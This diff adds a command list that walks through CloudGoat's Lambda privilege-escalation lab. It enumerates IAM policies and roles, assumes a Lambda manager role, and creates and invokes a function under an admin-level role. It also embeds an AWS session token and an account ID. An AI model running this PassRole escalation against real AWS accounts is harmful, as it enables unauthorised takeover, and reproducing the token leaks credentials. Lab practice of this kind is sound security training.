@@ -1,0 +1,65 @@
+aws sts get-caller-identity --profile chris
+
+
+aws iam list-attached-user-policies \
+   --user-name chris-cgidp2jpdix320 \
+   --profile chris
+
+
+aws iam get-policy-version \
+   --policy-arn arn:aws:iam::408844262892:policy/cg-chris-policy-cgidp2jpdix320 \
+   --version-id v1 \
+   --profile chris
+
+
+aws iam list-roles --profile chris
+
+
+aws iam list-attached-role-policies --role-name cg-debug-role-cgidp2jpdix320 --profile chris
+
+
+aws iam list-attached-role-policies --role-name cg-lambdaManager-role-cgidp2jpdix320 --profile chris
+
+
+aws iam get-policy-version --policy-arn arn:aws:iam::408844262892:policy/cg-lambdaManager-policy-cgidp2jpdix320 --version-id v1 --profile chris
+
+
+# This will not work
+
+aws sts assume-role --role-arn arn:aws:iam::408844262892:role/cg-debug-role-cgidp2jpdix320 --role-session-name wannaBeAdmin --profile chris
+
+
+aws sts assume-role --role-arn arn:aws:iam::408844262892:role/cg-lambdaManager-role-cgidp2jpdix320 --role-session-name lambdaManager --profile chris
+
+
+aws configure --profile lambdaManager
+
+
+aws configure --profile lambdaManager  set aws_session_token 'FwoGZXIvYXdzEPb//////////wEaDL2eCCOOb5mi85VxtiKxAXdefJ87batlNJlEMGwiosg/MKimOc2nibavIRa6uLdMXkNJEhqttaB+hoW7/JPQagvKQrWtWdzADstRjmj0du2ZqYg7Vh9LECJFQonccXrjOg31p5XlQTzJL7mz33sVohthVpwRw5eHtW1H0oJg3i3qptBNUnqKOBRv5p5qbd84drymDbvdcX7aqo06mAR88b4exiblPs1P3+nvIHNssqW2D1GWH8AV7hUPk9oxuERIFCjiroaGBjItBXuxC1rsGdxayBHq3L4Clghcbzd1rH3L8/wypoZnIAVqt6OohtedvB6EeSLQ'
+
+
+cd ~/Downloads/cloudgoat/lambda_privesc_cgidp2jpdix320/
+
+cat lambda_function.py
+
+# zip lambda_function.py.zip lambda_function.py
+
+
+aws lambda create-function \
+  --function-name admin_function \
+  --runtime python3.6 \
+  --role arn:aws:iam::408844262892:role/cg-debug-role-cgidp2jpdix320 \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://lambda_function.py.zip \
+  --profile lambdaManager
+  
+  
+aws lambda invoke \
+  --function-name admin_function \
+  out.txt \
+  --profile lambdaManager
+
+
+aws iam list-attached-user-policies \
+  --user-name chris-cgidp2jpdix320 \
+  --profile chris
